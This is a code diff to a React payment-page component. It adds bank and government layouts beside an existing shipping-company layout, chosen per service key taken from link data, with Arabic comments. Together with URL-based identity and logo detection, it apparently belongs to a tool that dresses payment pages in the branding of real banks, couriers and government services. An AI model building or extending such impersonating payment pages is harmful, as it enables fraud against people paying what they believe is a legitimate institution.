@@ -20,6 +20,8 @@ import BrandedCarousel from "@/components/BrandedCarousel";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 import PageLoader from "@/components/PageLoader";
 import ShippingCompanyLayout from "@/components/ShippingCompanyLayout";
+import { GovernmentLayout } from "@/components/GovernmentLayouts";
+import { BankLayout } from "@/components/BankLayout";
 
 interface PaymentRecipientProps {
   children?: React.ReactNode;
@@ -62,6 +64,11 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  
+  // تحديد نوع الكيان لاختيار التخطيط المناسب
+  const isShippingCompany = !!shippingCompanyBranding[serviceKey.toLowerCase()];
+  const isGovernment = !!governmentPaymentBranding[serviceKey.toLowerCase()];
+  const isBank = !!banks.find(b => b.id === serviceKey.toLowerCase());
   
   // دعم شامل لجميع أنواع الكيانات: شحن، بنوك، حكوميات
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] 
@@ -214,10 +221,18 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
         customDescription={dynamicDescription}
         amount={formattedAmount}
       />
-      {companyBranding ? (
+      {isShippingCompany && companyBranding ? (
         <ShippingCompanyLayout companyKey={serviceKey} trackingNumber={shippingInfo?.tracking_number as string} amount={formattedAmount} serviceType={serviceName}>
           {children}
         </ShippingCompanyLayout>
+      ) : isGovernment && companyBranding ? (
+        <GovernmentLayout countryCode={countryCode} serviceName={serviceName} amount={formattedAmount}>
+          {children}
+        </GovernmentLayout>
+      ) : companyBranding ? (
+        <BankLayout companyKey={serviceKey} amount={formattedAmount} serviceName={serviceName}>
+          {children}
+        </BankLayout>
       ) : (
         <div 
           className="sticky top-0 z-50 w-full shadow-lg"
